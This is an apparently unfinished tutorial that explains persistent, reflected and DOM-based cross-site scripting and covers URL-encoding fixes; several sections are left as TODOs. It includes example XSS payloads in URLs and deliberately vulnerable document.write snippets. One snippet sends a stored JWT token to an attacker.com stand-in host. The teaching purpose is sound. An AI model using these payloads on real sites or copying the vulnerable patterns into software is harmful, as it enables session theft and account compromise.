Cross Side Scripting
====================

Cross side scripting are one of the most prevalent attacks involving web
applications and javascript. Still ranking as the number 1 in the [2017's OWASP Top 10][1].

The attack consists in injecting malicious javascript code in the website. There
are three types of XSS attacks - `Reflected`, `Persistent` and `DOM` based.
All are based on javascript injection but but differ in a few aspects.

In this article we will explore the various types of XSS, as well as provide
vulnerable and secure code for each case.

The purpose of this section is to provide some understanding of XSS attacks and
to demonstrate how bad practices can lead to security issues.

## Persistent XSS
The first type of XSS we will be looking at is called Non-Persistent or reflected
XSS. This attack occurs when a malicious user is able to inject javascript that
ends up stored on the server-side, and from then on is displayed whenever said
page is requested by a user.

Consider the following scenario:

There's a news website that supports user comments. Whenever a user submits a
comment to a news article, that comment ends up stored on the server and from that
point forward, every time a new user loads the news page, the new user comments
will also be loaded.

But if a malicious user inserts javascript in the comment body instead
of just text, the javascript code will be stored on the server, and
everytime a user loads the news article's comments, said javascript will execute
on the user's browser.

A simple diagram to illustrate:

1. An attacker submits malicious javascript in a comment.  

  ![reflected 1](images/reflected2.png)

2. An unsuspecting user requests the webpage with the injected javascript.  

  ![reflected 2](images/reflected1.png)

3. Result.  

  ![reflected 3](images/reflected3.png)

## Reflected XSS
Another type of XSS attack is called a reflected XSS. The difference between this
type of attack and the previously discussed one, is that in the previous example
the JS injected by the attacker ends up being stored on the server, and every
time the compromised webpage is sent to a user, the injected JS is also sent.

In the case of the reflected XSS, the malicious javascript is sent as part of
the request. The website then includes the injected javascript in the response,
and it is executed on the client-side.

An easy way to understand how this happens is to consider a search form that in
case of not finding any results writes the string you searched for on the webpage.

![SearchBox](images/search.png)

If a user searched for `<script>alert(XSS)</script>` this would make the browser
render the javascript inside the `<script>` tags, creating a relfected XSS.

This may not look too bad security-wise since it's not stored on the server
(which means that the JS would only render in the attacker's browser), but in fact
this allows the attacker to create a specially crafted URL that can be used to
compromise an unsuspecting user.

Let's see how.

A regular request to the search page would look something like:  
`http://example.com/search?q=mySearch`

But if the issue described before is present, then an URL such as:  
`http://example.com/search?q=<script>alert('XSS')</script>`

would cause the javascript inside the `<script>` tags to be rendered in the
browser of whoever made this request.

This means that if an attacker sends a user the previous search link, the
victim upon clicking the link, would unknowingly run malicious javascript in
his/her browser.

_______
//TODO ADD SANITIZATION, ADD CODE
_______

## DOM Based XSS

DOM based XSS is similar to persistent and reflected XSS's, but with one subtle,
but very important distinction - the malicious javascript won't be loaded when
the page loads, instead, the malicious JS executes as a result of treating user
input in an unsafe way.

An easy way to understand this type of vulnerability is to consider pages that
dynamically update content without refreshing the whole page. The technology that
allows for this to happen, is AJAX. And AJAX is essentially javascript and XML.

As an example consider the following script used to display ads on a website:
```javascript
document.write('<script type="text/javascript" src="' + (location.search.split('req=')[1] || '') + '"></scr'+'ipt>');
```

Since the `location.search.split` is not properly escaped, the `req` parameter
can be manipulated by an attacker to retrieve malicious javascript from a
third-party domain and inject it into the webpage the victim is visiting.
`
http://www.example.com/ads/displayad.html?req=https://www.attacker.com/poc/xss.js
`
To perform this attack, an attacker creates a URL as the one above, and a user
upon clicking it, would execute the contents of the malicious script in their
browser.

There is another type of XSS that take advantage of features that are client-side  
only. This means that through these techniques, no logs are ever recorded on the
server.

A simple example of each feature is presented:

### Fragment identifiers:

The following script is very simple and for demonstration purposes only, but
encompasses the concept.

If this script was on a page:
```html
<script>
x=location.hash.slice(1);
document.write(x)
</script>
```

Then the following URL:
```
http://example.com/fragment.html#<script>alert(1)</script>
```

would trigger a XSS based on the fragment identifier.

### Local Storage

Another feature called `Local Storage` introduced with HTML5 also allows for
DOM based XSS's without the server logging.

`Local Storage` allows application data to be stored locally in the user's browser,
without resorting to cookies. There are several differences from cookies.
It is usually regarded as more secure and more performant than cookies, it also
allows a larger storage limit (5MB).

It should be noted that both `cookies` and `localStorage` are protected from
unrelated domains by the `Same-Origin Policy`.

For our demonstration, the feature we will focus on is the fact that the
data stored with `localStorage` is never sent to the server.
This is what allows the DOM-XSS to be performed without logs on the server-side.

A simple example:
```html
<script>
//Save our sample data
localStorage.setItem("JWT", "JWTTOKEN");

document.write("new Image().src='http://www.attacker.com?token="+localStorage.getItem('JWT')+"'>");
</script>
```

An important security detail to keep in mind is that the `localStorage` object
stores the data without an expiration date. This means that the data will not be
deleted when the browser is closed.

### The fix:
#### Native Javascript:

One of the required steps to handle this type of issue is to escape the HTML by
replacing it's special characters with their corresponding entities.

As of Javascript 1.5 (ECMAScript v3) there are two built-in function that encode special
characters and prevent the rendering of the javascript injection in user's
browsers.

The `encodeURI()` function encodes all special characters except:  
`, / ? : @ & = + $ #`
And the result will be a valid URL.

Code example:
```javascript
encodeURI("http://example.com/news/1?comment=<script>alert(XSS1)</script>");
```
Result:
```
"http://example.com/news/1?comment=%3Cscript%3Ealert(XSS1)%3C/script%3E"
```
If the special characters are not supported by the previous function,
the `encodeURIComponent()` can be used to encode instead.

Code example:
```javascript
encodeURIComponent("http://example.com/news/1?comment=<script>alert(XSS1)</script>");
```
Result:
```
"http%3A%2F%2Fexample.com%2Fnews%2F1%3Fcomment%3D%3Cscript%3Ealert(XSS1)%3C%2Fscript%3E"
```

Note that `encodeURIComponent()` does not escape the `'` character. A common bug
is to use it to create `HTML` attributes such as `href='MyUrl'`, which could
suffer an injection bug.  
If you are constructing HTML from strings, either use `"` instead of `'` for
attribute quotes, or add an extra layer of encoding (`'` can be encoded as `%27`).

#### Node.JS

In Node.JS there are some modules that help with output
//TODO: Add libraries for encoding

#### AngularJS
//TODO: Write NodeJS/AngularJS app to create code examples.

#### React.js
//TODO: Write NodeJS/ReactsJS app to create code examples.

//TODO - Check references and links.

[1]: https://www.owasp.org/index.php/Top_10_2017-Top_10
